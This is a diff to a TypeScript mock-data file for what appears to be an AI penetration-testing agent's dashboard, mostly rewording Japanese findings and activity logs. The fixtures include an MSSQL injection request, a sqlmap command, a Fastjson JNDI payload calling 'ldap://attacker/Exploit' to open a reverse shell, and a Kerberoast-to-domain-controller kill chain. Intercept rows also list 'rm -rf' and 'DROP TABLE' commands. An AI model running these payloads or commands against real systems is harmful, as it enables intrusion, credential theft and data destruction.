@@ -592,7 +592,7 @@ export const findings: Finding[] = [
     severity: "high",
     status: "pending",
     report:
-      "## 脆弱性の概要\n\n`www.acme.com/search` の `q` パラメーターに **エラーベース SQL インジェクション**（MSSQL）が存在し、データベースのバージョン、構造、機密データを読み取り可能です。\n\n## 影響\n\n- `acme_prod` のテーブル構造とユーザー / 注文データを読み取り可能\n- エラーの応答から悪用を容易に構成でき、高いリスク\n\n## 再現手順\n\n1. エラーベースの注入を実行：\n\n```\nGET /search?q=1' AND 1=CONVERT(int,@@version)--\n```\n\n2. MSSQL のバージョンを含むエラー応答で注入を確認\n3. データベースを列挙：`sqlmap -u \"https://www.acme.com/search?q=1\" --dbs`\n\n## 修正案\n\n- パラメーター化クエリ / プリペアドステートメントを使用し、文字列連結を廃止\n- 本番環境で詳細エラーを表示しない\n- DB アカウントを最小権限にし、`xp_cmdshell` などの危険な拡張機能を無効化\n",
+      "## 脆弱性の概要\n\n`www.acme.com/search` の `q` パラメーターに **エラーベース SQL インジェクション**（MSSQL）が存在し、データベースのバージョン、構造、機密データを読み取り可能です。\n\n## 影響\n\n- `acme_prod` のテーブル構造とユーザー / 注文データを読み取り可能\n- エラーの応答から悪用を容易に構成でき、高いリスク\n\n## 再現手順\n\n1. エラーベースの注入を実行：\n\n```\nGET /search?q=1' AND 1=CONVERT(int,@@version)--\n```\n\n2. MSSQL のバージョンを含むエラー応答で注入を確認\n3. データベースを列挙：`sqlmap -u \"https://www.acme.com/search?q=1\" --dbs`\n\n## 修正案\n\n- すべてパラメーター化クエリ / プリペアドステートメントに変更し、文字列連結を廃止\n- 本番環境で詳細エラーを表示しない\n- DB アカウントを最小権限にし、`xp_cmdshell` などの危険な拡張機能を無効化\n",
     summary: "www.acme.com/search の q にエラーベース SQL インジェクション",
     evidence: "GET /search?q=1' AND 1=CONVERT(int,@@version)-- → MSSQL のバージョンエラーが返り、データベース構造を読み取り可能。",
     intent_id: "i-2",
@@ -619,8 +619,8 @@ export const findings: Finding[] = [
     vulnclass: "Weak JWT",
     severity: "high",
     status: "pending",
-    summary: "API の JWT が弱いキーを使用し、オフラインでの解析と偽造が可能",
-    evidence: "HS256、キーは 'secret'。john で5秒で解析し、任意の sub を偽造して権限を逸脱可能。",
+    summary: "API の JWT が弱いキーを使用し、オフラインで総当たりして偽造可能",
+    evidence: "HS256、キーは 'secret'。john で5秒で解読し、任意の sub を偽造して権限を逸脱可能。",
     task_id: "t-acme-api",
     task_description: "api.acme.com の権限逸脱とインジェクションのテスト",
     ts: T("2026-07-26T03:02:00Z"),
@@ -732,7 +732,7 @@ export const findings: Finding[] = [
     status: "confirmed",
     report:
       "## 脆弱性の概要\n\n`shop.acme.com` の `/api/import` は **Fastjson 1.2.24** でユーザーが制御できる JSON を解析します。`safeMode` が無効で、`@type` に任意のクラスを指定して **JNDI インジェクション → リモートコマンド実行** が可能です。\n\n## 影響\n\n- 認証なしで DMZ の Web サーバー上の任意コマンドを実行可能（`www-data@dmz-web01`）\n- 権限昇格と組み合わせ、内部ネットワークへの足場となる\n\n## 再現手順\n\n1. JNDI payloadを作成：\n\n```json\n{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://attacker/Exploit\",\"autoCommit\":true}\n```\n\n2. `POST /api/import`、`Content-Type: application/json`\n3. 対象が dnslog に接続し、リバース shell を確立\n\n## 修正案\n\n- Fastjson を **1.2.83+** へ更新し、`safeMode` を有効化\n- `/api/import` に認証と送信元検証を追加\n- 業務サーバーから外部 LDAP / RMI への接続を禁止\n",
-    summary: "shop.acme.com Fastjson 1.2.24 のデシリアライズ RCE",
+    summary: "shop.acme.com Fastjson 1.2.24 のデシリアライズによるリモートコマンド実行",
     evidence:
       "POST /api/import に JNDI payload（@type:JdbcRowSetImpl）を送信 → dnslog に接続し、リバース shell（www-data@dmz-web01）を確立。",
     intent_id: "i7",
@@ -788,7 +788,7 @@ export const findings: Finding[] = [
     severity: "high",
     status: "pending",
     summary: "ドメインサービスアカウント svc_sql が Kerberoast 可能で、パスワードも脆弱",
-    evidence: "GetUserSPNs で svc_sql の TGS を要求し、hashcat -m 13100 で Sql@2020 をオフライン解析。SQL 管理グループのメンバー。",
+    evidence: "GetUserSPNs で svc_sql の TGS を要求し、hashcat -m 13100 で Sql@2020 をオフラインで解読。SQL 管理グループのメンバー。",
     intent_id: "i12",
     task_id: "t-acme-web",
     task_description: "Acme 公式サイトと管理画面の外部ペネトレーションテスト",
@@ -985,7 +985,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i12",
       type: "intent",
-      payload: P({ summary: "ドメインサービスアカウントの Kerberoasting とオフライン解析" }),
+      payload: P({ summary: "ドメインサービスアカウントの Kerberoasting とオフラインでの解読" }),
       priority: 8,
       state: "done",
       origin: "planner",
@@ -1104,7 +1104,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fa10",
       type: "fact",
-      payload: P({ summary: "Kerberoast で svc_sql の TGS を取得し、hashcat で Sql@2020 を解析" }),
+      payload: P({ summary: "Kerberoast で svc_sql の TGS を取得し、hashcat でパスワード Sql@2020 を解読" }),
       priority: 0,
       state: "open",
       origin: "work#12",
@@ -1178,7 +1178,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fiKerb",
       type: "finding",
-      payload: P({ summary: "Kerberoasting で svc_sql のパスワードを解析" }),
+      payload: P({ summary: "Kerberoasting で svc_sql のパスワードを解読" }),
       priority: 0,
       state: "confirmed",
       origin: "work#12",
@@ -1415,7 +1415,7 @@ export const activity: Activity[] = [
     ts: T("2026-07-25T14:13:00Z"),
     kind: "text",
     summary:
-      "ソース、内部のハードコードされたパスワード、Fastjson RCE から新しい経路ができました。目標層に g3「外部から DMZ を突破して内部への足場を確立」の登録を依頼し、i6（識別 / CVE の照合）と i7（RCE の実行）を割り当てます。DMZ の権限昇格は shell 取得に依存するため、次回の作業として記録します。",
+      "ソース、内部のハードコードされたパスワード、Fastjson RCE から新しい経路ができました。目標層に g3「外部から DMZ を突破して内部への足場を確立」の登録を依頼し、i6（識別 / CVE の照合）と i7（RCE の実行）を割り当てました。DMZ の権限昇格は shell 取得に依存するため、次回の作業として記録しました。",
   },
 
   // ── 第 2 轮 · 立足点已建，转内网（2026-07-25 20:25）──
@@ -1481,7 +1481,7 @@ export const activity: Activity[] = [
     tool_use_id: "p2-ai",
     summary: "add_intent × 4（足場を pivot として内部の水平移動を展開）",
     detail:
-      "intents=[\n  { summary: 'dmz-web01 を pivot として内部の 10.10.10.0/24 のホスト検出とポート識別を行う', asset_ids: [dmz-web01], parent_ids: [fa6], priority: 8 },\n  { summary: '内部での水平移動：ハードコードされたパスワード sa/Acme@2021 を使い、認証情報の再利用とパスワードスプレーを行う', parent_ids: [faCreds], priority: 8 },\n  { summary: '内部 Jenkins(10.10.10.20) の未認証 /script Groovy 実行(RCE)', parent_ids: [fa6], priority: 9 },\n  { summary: 'ドメインサービスアカウントの Kerberoasting とオフライン解析を行う', parent_ids: [fa6], priority: 8 },\n]\nホスト検出を先行して割り当て、残りの3件を並行した水平移動の探索経路とします。",
+      "intents=[\n  { summary: 'dmz-web01 を pivot として内部の 10.10.10.0/24 のホスト検出とポート識別を行う', asset_ids: [dmz-web01], parent_ids: [fa6], priority: 8 },\n  { summary: '内部での水平移動：ハードコードされたパスワード sa/Acme@2021 を使い、認証情報の再利用とパスワードスプレーを行う', parent_ids: [faCreds], priority: 8 },\n  { summary: '内部 Jenkins(10.10.10.20) の未認証 /script Groovy 実行(RCE)', parent_ids: [fa6], priority: 9 },\n  { summary: 'ドメインサービスアカウントの Kerberoasting とオフラインでの解読を行う', parent_ids: [fa6], priority: 8 },\n]\nホスト検出を先行して割り当て、残りの3件を並行した水平移動の探索経路とします。",
   },
   {
     seq: 1207,
@@ -1498,7 +1498,7 @@ export const activity: Activity[] = [
     ts: T("2026-07-25T20:26:20Z"),
     kind: "text",
     summary:
-      "g3 を達成し、攻撃対象を外部から内部に拡張しました。g4「内部で水平移動し、対象のドメインコントローラー DC01 を制御」の登録を依頼し、i9（ホスト検出）と i10 / i11 / i12 の3つの水平移動経路を並行して割り当てました。認証情報の再利用は faCreds に紐づけ、外部のソースから漏えいしたパスワードを内部の水平移動に使用します。",
+      "g3 を達成し、攻撃対象を外部から内部へ移行しました。g4「内部で水平移動し、対象のドメインコントローラー DC01 を制御」の登録を依頼し、i9（ホスト検出）と i10 / i11 / i12 の3つの水平移動経路を並行して割り当てました。認証情報の再利用は faCreds に紐づけ、外部のソースから漏えいしたパスワードを内部の水平移動に使用します。",
   },
 
   // ── 第 3 轮 · 靶标达成复盘（2026-07-26 00:25）──
@@ -1509,7 +1509,7 @@ export const activity: Activity[] = [
     ts: T("2026-07-26T00:25:16Z"),
     kind: "thinking",
     summary:
-      "今回の worker の出力を確認：i9→fa7「内部で DC01/FS01/JENKINS が稼働」、i11→fa8「Jenkins /script の未認証 Groovy」と fa9「Jenkins の認証情報ストアから acme\\svc_deploy の平文パスワードを取得」、i12→fa10「svc_sql の TGS を Kerberoast し、hashcat で Sql@2020 を解析」。svc_deploy は Domain Admins に所属し、i13 が psexec で DC01 を制御して secretsdump を実行済みです。g4 の条件（DC01 の制御）は達成したと考えられますが、確定前に finding の証拠経路を確認します。",
+      "今回の worker の出力を確認：i9→fa7「内部で DC01/FS01/JENKINS が稼働」、i11→fa8「Jenkins /script の未認証 Groovy」と fa9「Jenkins の認証情報ストアから acme\\svc_deploy の平文パスワードを取得」、i12→fa10「svc_sql の TGS を Kerberoast し、hashcat で Sql@2020 を解読」。svc_deploy は Domain Admins に所属し、i13 が psexec で DC01 を制御して secretsdump を実行済みです。g4 の条件（DC01 の制御）は達成したと考えられますが、確定前に finding の証拠経路を確認します。",
   },
   {
     seq: 1302,
@@ -2590,7 +2590,7 @@ export const activity: Activity[] = [
     intent_id: "i12",
     ts: T("2026-07-25T23:20:00Z"),
     kind: "result",
-    summary: "Kerberoasting で svc_sql のパスワードを解析し、ドメインコントローラーへの攻撃に使えるようグラフへ登録しました。",
+    summary: "Kerberoasting で svc_sql のパスワードを解読し、ドメインコントローラーへの攻撃に使えるようグラフへ登録しました。",
     input_tokens: 108000,
     output_tokens: 6800,
     cache_read_tokens: 72000,
@@ -3454,7 +3454,7 @@ export const interceptHistory: InterceptApprovalRow[] = [
     tool_name: "bash",
     tool_input: { command: "rm -rf /var/www/html" },
     status: "denied",
-    reason: "[モデル] 対象の本番ファイルを削除（D4）",
+    reason: "[模型] 対象の本番ファイルを削除（D4）",
     created_at: T("2026-07-25T18:00:00Z"),
     decided_at: T("2026-07-25T18:00:05Z"),
     conv_title: "",
@@ -3483,7 +3483,7 @@ export const interceptHistory: InterceptApprovalRow[] = [
     tool_name: "bash",
     tool_input: { command: 'mysql -e "DROP TABLE users_bak_0921"' },
     status: "pending",
-    reason: "[モデル] バックアップテーブルの可能性があり、本番データか判定不可",
+    reason: "[模型] バックアップテーブルの可能性があり、本番データか判定不可",
     created_at: T("2026-07-25T15:14:00Z"),
     conv_title: "",
     conv_agent_key: "",
@@ -3500,7 +3500,7 @@ interceptHistory.unshift({
   tool_input: { path: "reports/summary.md", content: "# 確認の要約\n\n今回の検証を完了し、既存の証拠と今後の推奨事項を整理しました。" },
   status: "allowed",
   decision_source: "model",
-  reason: "[モデル] 既存の確認結果をローカルのレポートへ書き込み、業務データは変更しません。",
+  reason: "[模型] 既存の確認結果をローカルのレポートへ書き込み、業務データは変更しません。",
   created_at: T("2026-07-26T08:00:00Z"),
   decided_at: T("2026-07-26T08:00:02Z"),
   conv_title: "",
@@ -3532,7 +3532,7 @@ export const interceptDetails: Record<number, InterceptAudit> = {
     ],
     captured_at: T("2026-07-26T08:00:00Z"),
     initial_action: "allow",
-    initial_reason: "[モデル] 既存の確認結果をローカルのレポートへ書き込み、業務データは変更しません。",
+    initial_reason: "[模型] 既存の確認結果をローカルのレポートへ書き込み、業務データは変更しません。",
     effective_action: "allow",
     config_digest: "b4c569fdb4c569fdb4c569fdb4c569fdb4c569fdb4c569fdb4c569fdb4c569fd1234",
     profile_id: 1,
@@ -3549,7 +3549,7 @@ export const interceptDetails: Record<number, InterceptAudit> = {
     context: [],
     captured_at: T("2026-07-25T15:14:00Z"),
     initial_action: "ask",
-    initial_reason: "[モデル] バックアップテーブルの可能性があり、本番データか判断できません。",
+    initial_reason: "[模型] バックアップテーブルの可能性があり、本番データか判断できません。",
     profile_id: 1,
     execution_status: "not_started",
   },
@@ -3703,7 +3703,7 @@ export const conversationMessages: Record<number, Activity[]> = {
       tool: "bash",
       tool_use_id: "c22",
       summary: '{"alg":"HS256","typ":"JWT"}',
-      detail: "HS256 の対称署名です。弱いキーの場合、オフラインで解析して偽造可能です。",
+      detail: "HS256 の対称署名です。弱いキーの場合、オフラインで総当たりして偽造可能です。",
     },
     {
       seq: 7,
@@ -3793,7 +3793,7 @@ export const conversationMessages: Record<number, Activity[]> = {
       ts: T("2026-07-26T00:22:12Z"),
       kind: "text",
       summary:
-        "完全なキルチェーン：\n1. .git の漏えい → ソースのホワイトボックス解析 + ハードコードされた認証情報\n2. shop の Fastjson RCE → DMZ のリバース shell\n3. sudo で root に昇格して足場を確立\n4. 内部調査 → DC01 / FS01 / Jenkins\n5. Jenkins の未認証アクセス → ドメインの認証情報 svc_deploy を取得\n6. Kerberoasting → svc_sql を解析\n7. svc_deploy の Domain Admins 権限 → psexec で DC01 を制御 → secretsdump で全ドメインのハッシュ取得\n\n4目標を達成し、17件の検出結果（高7 / 中4 / 低2 + 内部の8経路）を記録しました。",
+        "完全なキルチェーン：\n1. .git の漏えい → ソースのホワイトボックス解析 + ハードコードされた認証情報\n2. shop の Fastjson RCE → DMZ のリバース shell\n3. sudo で root に昇格して足場を確立\n4. 内部調査 → DC01 / FS01 / Jenkins\n5. Jenkins の未認証アクセス → ドメインの認証情報 svc_deploy を取得\n6. Kerberoasting → svc_sql のパスワードを解読\n7. svc_deploy の Domain Admins 権限 → psexec で DC01 を制御 → secretsdump で全ドメインのハッシュ取得\n\n4目標を達成し、17件の検出結果（高7 / 中4 / 低2 + 内部の8経路）を記録しました。",
     },
   ],
 };
@@ -4150,7 +4150,7 @@ export const llmRecords = [
     cache_read: 5200,
     cache_write: 0,
     status: "error",
-    error: "429 Too Many Requests（バックオフ後に再試行）",
+    error: "429 Too Many Requests（バックオフ後に再試行済み）",
   },
 ];
 
